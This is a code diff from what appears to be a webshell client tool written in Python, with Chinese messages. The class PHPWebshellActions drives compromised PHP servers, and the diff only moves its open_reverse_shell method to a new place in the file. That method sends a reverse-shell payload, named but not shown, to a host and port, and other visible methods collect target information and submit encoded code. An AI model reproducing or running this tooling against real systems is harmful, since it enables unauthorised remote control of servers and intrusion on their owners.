@@ -1125,6 +1125,13 @@ class PHPWebshellActions(PHPSessionInterface):
         )
         return first_string + second_string == result
 
+
+    async def open_reverse_shell(self, host: str, port: int) -> None:
+        code = format_phpcode(REVERSE_SHELL, host=string_repr(host), port=str(port))
+        result = await self.submit(code)
+        if result == "WRONG_NO_METHOD":
+            raise TargetError("目标打开反弹shell对应的函数")
+
     async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
         json_result = await self.submit(GET_BASIC_INFO_PHP)
         raw_result = None
@@ -1174,12 +1181,6 @@ class PHPWebshellActions(PHPSessionInterface):
             code_b64=string_repr(base64_encode(body)),
         )
         return await self.submit_http(code)
-
-    async def open_reverse_shell(self, host: str, port: int) -> None:
-        code = format_phpcode(REVERSE_SHELL, host=string_repr(host), port=str(port))
-        result = await self.submit(code)
-        if result == "WRONG_NO_METHOD":
-            raise TargetError("目标打开反弹shell对应的函数")
 
     async def submit(self, payload: str) -> str:
         raise NotImplementedError("子类提供这个函数以驱动这些Actions函数")
